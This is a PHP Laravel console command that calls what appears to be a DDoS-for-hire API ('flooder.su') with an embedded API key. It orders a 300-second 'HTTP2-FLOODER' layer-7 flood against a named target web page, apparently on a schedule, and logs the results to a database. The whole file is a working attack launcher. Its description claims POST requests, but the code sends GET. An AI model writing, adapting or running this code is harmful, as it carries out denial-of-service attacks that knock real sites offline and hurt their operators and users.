<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\Http;
use App\Models\History;

class MakeApiRequest extends Command
{
    protected $signature = 'api:make-request';
    protected $description = 'Make a POST request to the API every 300 seconds and store the response in the history table';

    public function __construct()
    {
        parent::__construct();
    }

    public function handle()
    {
        $url = 'https://flooder.su/API/l7';
        $params = [
            'api_key' => 'f716e197-43942b79-6b3bbb8a-9f56ad44',
            'host' => 'https://sumant.captainweb.xyz/madam/index.html',
            'time' => 300, // Fixed time parameter
            'method' => 'HTTP2-FLOODER',
            'rmethod' => 'GET',
            'data' => '',
            'header' => 'GET',
            'request' => 50,
            'geo' => 'WORLDWIDE',
            'concurrents' => 1, // Fixed concurrent parameter
        ];

        try {
            $response = Http::get($url, $params);
            $responseBody = $response->json();

            if (isset($responseBody['status']) && $responseBody['status'] === 'success') {
                History::create([
                    'status' => $responseBody['status'],
                    'msg' => $responseBody['msg'],
                    'api_id' => $responseBody['id'] ?? null,
                    'params' => json_encode($responseBody['params'] ?? []),
                ]);

                $this->info('API request was successful.');
            } else {
                $this->error('Unexpected response structure.');
            }
        } catch (\Exception $e) {
            $this->error('API request failed. Error: ' . $e->getMessage());
        }
    }
}
